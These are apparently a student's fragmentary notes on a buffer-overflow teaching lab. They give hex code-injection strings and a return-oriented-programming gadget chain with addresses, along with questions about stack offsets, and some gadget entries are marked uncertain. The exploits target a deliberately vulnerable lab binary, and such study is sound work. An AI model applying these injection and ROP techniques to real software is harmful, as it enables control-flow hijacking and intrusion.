2. 
为什么 cookie值与读出来的cookie值不一样？？？

3.
48 c7 c7 00 44 67 55 68
69 21 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
e8 43 67 55 00 00 00 00
31 65 61 35 31 30 62 37

-->>

48 c7 c7 08 44 67 55 68
69 21 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
e8 43 67 55 00 00 00 00
31 65 61 35 31 30 62 37

movq $0x55674408, %rdi
pushq $0x402169
ret

就过了，也就是说明test中返回地址上面的字符串的起始位置是Gets->$rsp + 8 + 0x18 + 8的位置
但按理来说不应该是Gets->$rsp + 8 + 0x18吗？？

4.


5.

movq %rsp,%rax
//setval_430
eb 22 40 00 00 00 00 00

movq %rax,%rdi
//setval_123
62 22 40 00 00 00 00 00

popq %rax
//addval_493
70 22 40 00 00 00 00 00

movl %eax,%ecx
//getval_163
de 23 40 00 00 00 00 00

movl %ecx,%edx
??
//addval_155
35 23 40 00 00 00 00 00


movl %edx,%esi
??
//getval_106
a1 23 40 00 00 00 00 00

lea    (%rdi,%rsi,1),%rax
//add_xy
a7 22 40 00 00 00 00 00


62 22 40 00 00 00 00 00
//setval_123
movq %rax,%rdi


e9 22 40 00 00 00 00 00
60 22 40 00 00 00 00 00
70 22 40 00 00 00 00 00
de 23 40 00 00 00 00 00
35 23 40 00 00 00 00 00
76 23 40 00 00 00 00 00
a7 22 40 00 00 00 00 00
63 22 40 00 00 00 00 00